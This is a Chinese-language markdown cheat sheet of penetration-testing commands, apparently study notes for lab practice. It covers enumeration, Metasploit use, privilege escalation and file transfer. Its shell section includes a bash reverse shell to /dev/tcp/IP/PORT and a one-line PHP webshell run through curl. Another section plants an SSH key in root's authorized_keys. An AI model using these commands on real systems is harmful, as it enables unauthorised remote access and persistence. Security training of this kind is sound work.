# 🛠️ 渗透测试常用工具命令笔记

## 🧰 基本操作工具

### 🔌 VPN & 网络

| 命令                     | 描述                        |
| ------------------------ | --------------------------- |
| `sudo openvpn user.ovpn` | 连接到 VPN                  |
| `ifconfig` / `ip a`      | 查看 IP 地址                |
| `netstat -rn`            | 显示路由表和 VPN 可访问网络 |
| `ssh user@10.10.10.10`   | SSH 连接远程主机            |
| `ftp 10.129.42.253`      | FTP 连接目标服务器          |

---

### 🧱 Tmux 快捷键

| 快捷键     | 描述           |
| ---------- | -------------- |
| `tmux`     | 启动 tmux      |
| `Ctrl+b`   | tmux 前缀      |
| `prefix c` | 新建窗口       |
| `prefix 1` | 切换到窗口 1   |
| `prefix %` | 垂直分割窗格   |
| `prefix "` | 水平分割窗格   |
| `prefix →` | 切换至右侧窗格 |

---

### ✍️ Vim 操作命令

| 命令       | 描述           |
| ---------- | -------------- |
| `vim file` | 打开文件       |
| `Esc+i`    | 插入模式       |
| `Esc`      | 普通模式       |
| `x`        | 删除字符       |
| `dw`       | 删除单词       |
| `dd`       | 删除整行       |
| `yw`       | 复制单词       |
| `yy`       | 复制整行       |
| `p`        | 粘贴           |
| `:1`       | 跳转第 1 行    |
| `:w`       | 保存文件       |
| `:q`       | 退出           |
| `:q!`      | 强制退出不保存 |
| `:wq`      | 保存并退出     |

---

## 🔍 渗透测试流程命令

### 1️⃣ 服务扫描 & 网络发现

| 命令                                              | 描述                     |
| ------------------------------------------------- | ------------------------ |
| `nmap <IP>`                                       | 快速扫描                 |
| `nmap -sV -sC -p- <IP>`                           | 全端口 + 脚本扫描        |
| `locate scripts/citrix`                           | 查找相关脚本             |
| `nmap --script smb-os-discovery.nse -p445 <IP>`   | SMB 枚举                 |
| `netcat <IP> 22`                                  | 横幅探测                 |
| `smbclient -N -L \\\\<IP>`                        | 枚举 SMB 共享            |
| `smbclient \\\\<IP>\\users`                       | 连接共享目录             |
| `snmpwalk -v 2c -c public <IP> 1.3.6.1.2.1.1.5.0` | SNMP 枚举                |
| `onesixtyone -c dict.txt <IP>`                    | 暴力破解 SNMP 社区字符串 |

---

### 2️⃣ Web 枚举

| 命令                                     | 描述                      |
| ---------------------------------------- | ------------------------- |
| `gobuster dir -u http://<IP>/ -w <字典>` | 目录扫描                  |
| `gobuster dns -d domain.com -w <字典>`   | 子域名爆破                |
| `curl -IL <URL>`                         | 获取响应头信息            |
| `whatweb <IP>`                           | Web 技术探测              |
| `curl <IP>/robots.txt`                   | robots.txt 枚举           |
| `Ctrl+U`                                 | 查看网页源代码（Firefox） |

---

### 3️⃣ 漏洞利用

| 命令                         | 描述             |
| ---------------------------- | ---------------- |
| `searchsploit openssh 7.2`   | 查询漏洞库       |
| `msfconsole`                 | 启动 Metasploit  |
| `search exploit eternalblue` | 搜索漏洞模块     |
| `use exploit/...`            | 使用指定漏洞模块 |
| `show options`               | 查看模块参数     |
| `set RHOSTS <IP>`            | 设置目标         |
| `check`                      | 检测漏洞存在性   |
| `exploit`                    | 执行漏洞利用     |

---

### 4️⃣ Shell 操作

| 命令                                                | 描述               |
| --------------------------------------------------- | ------------------ |
| `nc -lvnp 1234`                                     | 启动监听           |
| `bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'`        | Bash 反弹 shell    |
| `python -c 'import pty; pty.spawn("/bin/bash")'`    | 升级交互式 shell   |
| `Ctrl+Z → stty raw -echo → fg`                      | 修复交互式 TTY     |
| `echo "<?php system(\$_GET['cmd']);?>" > shell.php` | 创建 WebShell      |
| `curl http://IP/shell.php?cmd=id`                   | 执行 WebShell 命令 |

---

### 5️⃣ 权限提升

| 命令                                             | 描述                      |
| ------------------------------------------------ | ------------------------- |
| `./linpeas.sh`                                   | 本地枚举脚本              |
| `sudo -l`                                        | 查看可用 sudo 权限        |
| `sudo su`                                        | 切换 root（如果权限允许） |
| `ssh-keygen -f key`                              | 生成 SSH 密钥             |
| `echo "pubkey..." >> /root/.ssh/authorized_keys` | 添加公钥到 root           |
| `ssh root@IP -i key`                             | 使用私钥登录              |

---

### 6️⃣ 文件传输

| 命令                               | 描述               |
| ---------------------------------- | ------------------ |
| `python3 -m http.server 8000`      | 启动临时 HTTP 服务 |
| `wget http://IP:8000/file`         | 下载文件           |
| `curl http://IP:8000/file -o file` | curl 下载文件      |
| `scp file user@IP:/tmp/file`       | 通过 SSH 传输      |
| `base64 file -w 0`                 | 转 Base64          |
| `echo BASE64 | base64 -d > file`   | 还原 Base64        |
| `md5sum file`                      | 校验完整性         |

---

